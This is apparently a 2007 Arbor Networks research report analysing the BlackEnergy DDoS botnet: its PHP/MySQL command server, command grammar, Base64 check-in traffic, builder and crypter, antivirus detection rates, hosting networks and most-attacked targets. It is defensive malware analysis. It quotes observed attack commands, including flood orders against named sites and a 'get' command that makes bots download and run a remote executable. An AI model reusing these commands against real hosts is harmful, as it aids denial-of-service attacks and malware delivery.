Unlike most\ncommon bots, this bot does not communicate with the botnet master using IRC. Also, we\ndo not see any exploit activities from this bot, unlike a traditional IRC bot. This is a small\n(under 50KB) binary for the Windows platform that uses a simple grammar to\ncommunicate. Most of the botnets we have been tracking (over 30 at present) are located\nin Malaysian and Russian IP address space and have targeted Russian sites with their\nDDoS attacks.\n\nThis report is based on analysis of the distribution package of the BlackEnergy botnet,\ntracking approximately 30 live and distinct botnets, and disassembly of several samples\ncaptured in the wild.\n\n\n-----\n\n## Introduction\n\nBlackEnergy is a web-based distributed denial of service (DDoS) bot used by the Russian\nhacker underground. We have begun tracking various networks using this bot to\ncommand and control their botnets. BlackEnergy gives the attackers an easy to control\nweb-based bot that can launch various attacks and control the bots using a minimal\nsyntax and structure. The BlackEnergy tools appear to have been developed by one or\nmore Russian hackers. Also, at this time, most of the BlackEnergy command and control\nsystem (C&C) systems we have seen are hosted in Malaysia and Russia and are attacking\nRussian targets.\n\nOne of the main features the BlackEnergy bot author likes to promote in forums is that\nthe bot can target more than one IP address per hostname. The authors promote that this\nfeature is designed for targets that use DNS load balancing and ensures that their bots\ntarget all hosts for the attack. Also, the bot author has used a runtime encrypter to thwart\nantivirus detection.\n\n## Bot Command System\n\nThe BlackEnergy HTTP C&C is built on PHP, MySQL. In our investigations we often\nsee compromised Linux or BSD servers that have been set up for this purpose. The\ntoolkit has common filenames, such as “auth.php” and “db.sql”, and an informative help\nfile written in Russian. The system normally installs with a password protection scheme\nusing HTTP basic authentication to protect the botnet. Much of what we have learned\nabout this botnet has come from captured PHP files and unprotected installations.\n\nThe botnet configuration is stored in a simple MySQL database. The commands have the\nfollowing database schema:\n\nCREATE TABLE `opt` (\n`name` varchar(255) NOT NULL,\n`value` varchar(255) NOT NULL,\nPRIMARY KEY (`name`)\n);\n\nThe values for “name” can be any of the following and mirror the web UI controls (see\nbelow):\n\n  - attack_mode – a numerical value for the type of attack (default, drop by socket,\n\ndrop by timeout)\n\n  - cmd – the command to send to the bot (see below)\n\n  - http_freq – how many requests per second to send in HTTP GET flood mode\n\n  - http_threads – how many program threads to create for the HTTP flood\n\n  - icmp_freq – how many ICMP packets to send in an ICMP attack mode\n\n  - icmp_size – how large of ICMP packets to send in ICMP attack mode\n\n  - max_sessions – for ‘drop by timeout’\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\n  - spoof_ip – Boolean, used in raw packet flooding attacks\n\n  - syn_freq – how frequently to send packets during a TCP SYN flood\n\n  - tcpudp_freq – how often to send TCP or UDP traffic\n\n  - tcp_size – how large the TCP packets should be\n\n  - udp_size – how large the UDP packets should be\n\n  - ufreq – how long (in minutes) to wait before checking for another command\n\nA small table ‘stat’ is also created to track the size of the botnet and how well it has\ngrown over time.\n\nCREATE TABLE `stat` (\n`id` varchar(50) NOT NULL,\n`addr` varchar(16) NOT NULL,\n`time` int(11) NOT NULL,\n`build` varchar(255) NOT NULL,\nPRIMARY KEY (`id`)\n);\n\nThe time a bot has polled the web server, the client’s IP address, and the build ID it\npresents in the POST data are all logged. The botnet control interface (see below)\npresents a summary of this information to the botnet master.\n\n## Bot Command Vocabulary\n\nThe BlackEnergy bot has a minimal vocabulary, based around three different types of\ncommands. The first are the DDoS attack commands, the second is a download\nfunctionality, and the third are commands to stop the bot. Mutiple commands may also be\ngiven and are separated by a semicolon, ie ‘get http://1.2.3.4/sample.exe;wait’.\n\nDDoS attacks the BlackEnergy botnet can launch are controlled by the following\narguments to the ‘flood’ command:\n\n  - icmp – a basic ICMP ping flood\n\n  - syn – a basic TCP SYN flood\n\n  - udp – a basic UDP traffic flood\n\n  - http – an HTTP GET request flooder. This command is given in the format ‘flood\n\nhttp <hostname> <optional URI>’, for example “flood http www.li-da.org\nindex.php”. If no URI is given the bot will flood ‘/’.\n\n  - data – a basic binary packet flooder\n\n  - dns – a DNS request flooder\n\nSeveral of these attacks – the ICMP flood, the TCP SYN flood, the UDP flood, the DNS\nflood and possibly the data flood attack – can utilize spoofed source addresses.\n\nBlackEnergy also has a simple download mechanism. Although it is not documented in\nthe versions we have analyzed we have seen it used in the wild. The command to tell the\nbots to fetch and launch a new executable is ‘get <url>’, i.e. “#get\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nhttp://85.255.120.26/files/setup.exe”. This is similar to the IRC bot commands where a\nsimple downloader is built into most bots. This binary does not seem to replace the\noriginal BlackEnergy bot binary, so it is unclear how the bots would be updated via this\nmechanism in the wild.\n\nFinally, the bots can be told to remain silent and only check back for new commands via\nthe “wait” or “stop” commands. “Stop” may be used to tell the bot to cease all DDoS\nattacks, and “wait” may just be a placeholder for the bots. Finally, the “die” command\ntells the bots to exit.\n\n## Bot Communications\n\nThe BlackEnergy botnet uses HTTP to communicate to its controlling servers by sending\na POST message to the server. The message contains information about the bot’s ID and\nits build ID. The specific bot ID is built from the system’s SMB hostname and the\nSystem Volume ID from the C:\\ drive. The botnet manager sets the build ID for the bot\nwhen the bot binary is built. This build ID could be used for tracking updates and\ndistributions, or it could be used to screen out interlopers, such as our BlackEnergy\ntracker. When possible we set the build ID to an observed value.\n\nHere is a bot checking into to the botnet controller at the URL\nhttp://psamtek.cn/dot/stat.php, showing the POST data and the header values. In this case,\nthe malware was running on an Intel x86-based processor running Windows XP SP2.\nData was captured using the CWSandbox automated analysis system.\n\n\nPOST /dot/stat.php HTTP/1.1\n\n\nContent-Type: application/x-www-form-urlencoded\n\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;\n.NET CLR 1.1.4322)\n\n\nHost: psamtek.cn\n\n\nContent-Length: 31\n\n\nCache-Control: no-cache\n\n\nid=xCR2_243AEDBA&build_id=D5729\n\nAn example of what the bot would receive in response is shown below:\n\n\nHTTP/1.1 200 OK\n\n\nDate: Tue, 25 Sep 2007 08:30:13 GMT\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nServer: Apache/2.0.59 (Unix) FrontPage/5.0.2.2635 PHP/5.2.3\nmod_ssl/2.0.59 OpenSSL/0.9.7e-p1\n\n\nX-Powered-By: PHP/5.2.3\n\n\nContent-Length: 80\n\n\nConnection: close\n\n\nContent-Type: text/html\n\n\nMTA7MjAwMDsxMDswOzA7MzA7MTAwOzM7MjA7MTAwMDsyMDAwI3dhaXQjMTAjeENSMl8yN\nDNBRURCQQ==\n\nThe response is Base64 encoded, and a simple transformation of this data show the\ncommand issued to the bots:\n\n'10;2000;10;0;0;30;100;3;20;1000;2000#wait#10#xCR2_243AEDBA'\n\nSplitting the fields along the ‘#’ reveals that bot has no specific commands at this time\nand should come back in ten minutes, although packet flooding options are always\nexpressed. The fields are separated by a semicolon and are, in order: ICMP frequency,\nICMP packet size, SYN frequency, spoof IP or not (Boolean value), the attack mode, the\nmaximum number of HTTP sessions, the HTTP connection frequency, the number of\nHTTP threads, the TCP and UDP frequency, the UDP size, and the TCP packet size. The\nbot’s host ID is also echoed back to the bot, but it is unclear what purpose this serves.\n\nActual other commands we have seen from BlackEnergy botnets include:\n\n2;2;5;0;2;5;2000;2;20;1026;1#flood syn hywd.info 80#60#xHOST\n\n10;3000;10;1;0;30;10;25;15;2000;3000#flood http\npartyofregions.org.ua#5#xHOST\n\n1;999999;888888;0;0;30;1;99999997999999999;1;99999;9999#flood udp;\ndns; icmp; http; syn; 77.91.226.6#15#xHOST\n\n10;2000;10;1;0;30;50;50;20;1000;2000#flood syn www.ceag.ru,ceag.ru\n80,81,82,83,443,25,22,21,110#10#xHOST\n\nThese commands reveal how flexible the DDoS options can be with this botnet. Note that\nthe botnet tracker SMB hostname has been removed from all of the log examples.\n\nBased on the POST data sent to the botnet C&C we observe at least three different major\nvariants of the bot. The first uses a simple two-part data string to communicate with the\nweb server, presenting the bot host ID and the build ID using two different variables.\nAnother variant uses only one variable, ‘data’, to submit this information, and separates\nthese two values with a colon (‘:’). The third type of BlackEnergy bot we see sends\nsignificantly more information to the botnet, including the bot’s ability to provide a\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nSOCKS proxy, an HTTP proxy, as well as if it can receive an ICMP echo and its network\nspeed. The evolutionary timeline of these variants is unclear at this time.\n\n## Botnet Runtime Configuration \n\nThe botnet master is given a simple PHP-based web UI to configure their botnet and\ngiven minimal statistics. This has the benefit of reducing the programming burden on the\nbotnet master as well as presenting some minimal statistics for them.\n\n## Availability\n\nBlackEnergy is not widely available on the web, however in Russian language forums for\ncomputer hackers and the underground we have seen prices for BlackEnergy bots at\naround US$40. The latest version is believed to be BlackEnergy version 1.7, released\nsometime in the summer of 2007. The BlackEnergy kit includes the web front end in PHP\nand with a MySQL setup (the schema, shown above, and the PHP code that integrates\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nwith it), as well as the Windows bot binary and builder. The file listing from a captured\nBlackEnergy 1.7 kit is shown below.\n\nArchive: BlackEnergy DDoS Bot.zip\nLength   Date  Time  Name\n--------  ----  ----  ---0 09-30-07 07:58  BlackEnergy DDoS Bot/\n0 09-30-07 07:58  BlackEnergy DDoS Bot/1.7/\n78336 06-14-07 01:15  BlackEnergy DDoS Bot/1.7/builder.exe\n19456 06-20-05 17:11  BlackEnergy DDoS Bot/1.7/cadt.dll\n15977 06-05-07 21:15  BlackEnergy DDoS Bot/1.7/calc.exe\n36352 05-11-07 02:01  BlackEnergy DDoS Bot/1.7/crypt.exe\n896 02-27-07 02:46  BlackEnergy DDoS Bot/1.7/db.sql\n30 06-05-07 20:46  BlackEnergy DDoS Bot/1.7/pass.txt\n0 06-04-07 22:25  BlackEnergy DDoS Bot/1.7/www/\n1505 06-04-07 22:23  BlackEnergy DDoS Bot/1.7/www/auth.php\n1517 06-04-07 22:26  BlackEnergy DDoS Bot/1.7/www/cmdhelp.html\n319 06-04-07 22:23  BlackEnergy DDoS Bot/1.7/www/config.php\n5631 06-04-07 22:24  BlackEnergy DDoS Bot/1.7/www/index.php\n492 01-23-07 06:40  BlackEnergy DDoS Bot/1.7/www/MySQL.php\n987 06-04-07 22:20  BlackEnergy DDoS Bot/1.7/www/stat.php\n807 10-11-06 13:14  BlackEnergy DDoS Bot/1.7/www/style.css\n29184 06-06-07 22:46  BlackEnergy DDoS Bot/1.7/_bot.exe\n--------          ------191489          17 files\n\nA system driver, “syssrv.sys”, is used to hide the bot’s processes and files, and is\nprovided in the package as the file “calc.exe”. This is a basic rootkit that may or may not\n“ship” with the bot during an infection cycle. The file “_bot.exe” is the encrypted bot\nbinary (see below). Because no exploit code is included in the basic BlackEnergy HTTP\nbot, external tools and methods must be used to load the bot onto a victim PC.\n\nThe files under “www/” contain the web server functionality and settings to communicate\nwith the database as well as the password for users to log in, which is stored in “pass.txt”.\nThe botnet will communicate with the file “stat.php”, and the administrator will interact\nwith the PHP scripts “auth.php” to authenticate and “index.php” for botnet control and\nreporting.\n\n## BlackEnergy Build Time Configuration\n\nThe BlackEnergy bot, like most bots, uses a C&C server that is hardcoded into the\ncompiled binary itself. The BlackEnergy kit is provided with a GUI configuration and\nbuild tool (builder.exe). The user can set up the location of the C&C server as well as\ndefaults for attacks and actions. While the user can change the value, a unique build ID\nfor the bot binary is generated at every invocation of the builder.exe program. This GUI\ntool is shown below.\n\nUnlike most bots, however, the builder file calls a second executable over the bot binary\n(bot.exe) to encrypt it, yielding “_bot.exe” (by default), the final version of the bot. This\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nis designed to defeat most antivirus detection. This “crypter” leaves a telltale signature in\nthe binary that can be fingerprinted using a tool such as PEID. At runtime, the bot binary\nwill decrypt itself in memory and execute as a normal Windows executable.\n\n## Detection by AntiVirus\n\nA representative malware sample was used to determine AV coverage estimates,\nassuming the sample was a typical bot and had been known for at least 24 hours. What\nwe found is that only a handful AV tools detect this sample in a meaningful way, and\nsome with misleading names such as “Downloader”, “BHO” (indicating a simple Internet\nExplorer Browser Helper Object), or spyware. This multi-scanner detection was\nperformed using the VirusTotal service on September 25, 2007, at 17:26 CET.\n\nThe specific file scanned had these attributes:\n\nFile size: 3193 bytes\nMD5: ceeb67fb80be75fe8000713f15ae6c27\nSHA1: f2b19ceb78219373933321a079b795a10c2f78d2\n\nAhnLab-V3 2007.9.22.0/20070924 found nothing\nAntiVir 7.6.0.15/20070925 found [ADSPY/Bho.CX.14]\nAuthentium 4.93.8/20070925 found nothing\nAvast 4.7.1043.0/20070924 found nothing\nAVG 7.5.0.485/20070925 found nothing\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\nBitDefender 7.2/20070925 found nothing\nCAT-QuickHeal 9.00/20070924 found [TrojanDownloader.Agent.dob]\nClamAV 0.91.2/20070925 found nothing\nDrWeb 4.33/20070925 found nothing\neSafe 7.0.15.0/20070923 found [suspicious Trojan/Worm]\neTrust-Vet 31.2.5162/20070925 found nothing\nEwido 4.0/20070924 found nothing\nF-Prot 4.3.2.48/20070925 found nothing\n\nfound [Trojan\nF-Secure 6.70.13030.0/20070925 Downloader.Win32.Agent.dob]\n\nFileAdvisor 1/20070925 found nothing\nFortinet 3.11.0.0/20070925 found [W32/Agent.DOB!tr.dldr]\n\n\nIkarus T3.1.1.12/20070925\n\n\nfound [TrojanDownloader.Win32.Small.edb]\n\n\nfound [Trojan\nKaspersky 4.0.2.24/20070925 Downloader.Win32.Agent.dob]\n\nMcAfee 5126/20070924 found nothing\nMicrosoft 1.2803/20070925 found nothing\nNOD32v2 2549/20070925 found nothing\nNorman 5.80.02/20070925 found [Harnig.gen1]\nPanda 9.0.0.4/20070925 found [Suspicious file]\nPrevx1 V2/20070925 found [Malware.Gen]\nRising 19.42.11.00/20070925 found nothing\nSophos 4.21.0/20070925 found [Mal/Packer]\nSunbelt 2.2.907.0/20070925 found [VIPRE.Suspicious]\nSymantec 10/20070925 found [Downloader]\nTheHacker 6.2.5.068/20070925 found nothing\n\nfound [Trojan\nVBA32 3.12.2.4/20070925 Downloader.Win32.Agent.dob]\n\nVirusBuster 4.3.26:9/20070925 found [Packed/FSG]\nWebwasherGateway 6.0.1/20070925 found [Ad-Spyware.Bho.CX.14]\n\nWe have sent several samples of BlackEnergy binaries captured in the wild to various\nAV firms and research partners.\n\n## BlackEnergy DDoS Attack Activity\n\nWe have been tracking BlackEnergy botnets to study their popularity and the severity of\nthe attacks they have been launching. To date (October 2, 2007) we have identified 27\nactive DDoS networks built on the BlackEnergy bot system. These URLs map back to 19\ndistinct IP addresses. 5 HTTP servers for BlackEnergy bots are located in TTNET, a\nMalaysian ISP using ASNs 9930 and 9121. The complete list of ASNs and counts is here:\n\n1 server 16265 LEASEWEB LEASEWEB AS\n1 23393 ISPRIME - ISPrime Inc.\n1 23898 HOSTFRESH-AS-AP HostFresh Internet\n1 25532 MASTERHOST-AS .masterhost autonomous system\n1 26780 MCCOLO - McColo Corporation\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\n1 39561 AGAVA Agava JSC AS number\n1 41126 CENTROHOST-AS JSC Centrohost\n1 41339 LEADERHOST-AS LeaderHost Ltd.\n1 8342 RTCOMM-AS RTComm.RU Autonomous System\n1 8560 ONEANDONE-AS 1&1 Internet AG\n2 17992 AIMS-AP Applied Information Management Services.\n2 27595 INTERCAGE - InterCage\n2 9930 TTNET-MY TIMEdotNet Berhad\n3 servers 9121 TTNET TTnet Autonomous System\n\nA number of the targets of these botnets are located in Russian DNS or IP address space.\nWe are not clear on the connection between the botnet and the targets. The ten most\nfrequently attacked targets in a one week period starting September 26, 2007, are shown\nin the table below, based on actively polling the BlackEnergy botnet C&C server.\n\n19 attacks partyofregions.org.ua\n20 77.91.226.6\n27 offshoreltd.biz\n33 forum.asechka.ru\n41 www.leo-davinci.ru\n41 rx-login.com\n53 radiovkontakte.net.ru\n55 hywd.info\n65 russian-iphone.com\n104 netplace.ru\n\nSeveral of the botnets examined at contain a few hundred or less bots in them. Because of\nthe authentication required to view the configuration in many of the setups, we cannot\naccurately estimate the size of the world’s BlackEnergy botnets.\n\n## Conclusions\n\nThe BlackEnergy DDoS bot is another web-based bot that follows the standard models in\nthis emerging malcode space. It uses a user-defined poll interval to look for new\ncommands and a simple command structure. Like other web-based bots, it uses Base64\nencoding of the commands to obscure the attackers’ intentions. We do not see significant\nDDoS attacks from most of these networks at this time, although we do know that at least\none network was involved in high profile attacks on a Norwegian bank.\n\nBlackEnergy appears to be a recently developed bot in active development, and the\nauthor has clearly lofty goals of AV detection and stealth. We expect more developments\nin the near future with this bot, and possibly more high profile DDoS targets as the\nattackers utilize their botnet.\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----\n\n## Acknowledgements\n\nThe author wishes to thank the following individuals for their assistance in finding more\nBlackEnergy networks to track and additional information about this bot codebase: MJ,\nTF, JK, GW, P, W, and TK.\n\n## Sources\n\n1. forum.xeka.ru/showthread.php?p=1077\n2. http://www.turbohide.com/index.php?q=aHR0cDovL2luZGV0YWlscy5pbmZvL\n\nw%3D%3D via the Google translator cache.\n\nCopyright © 2007 Arbor Networks, all rights reserved.\n\n\n-----",
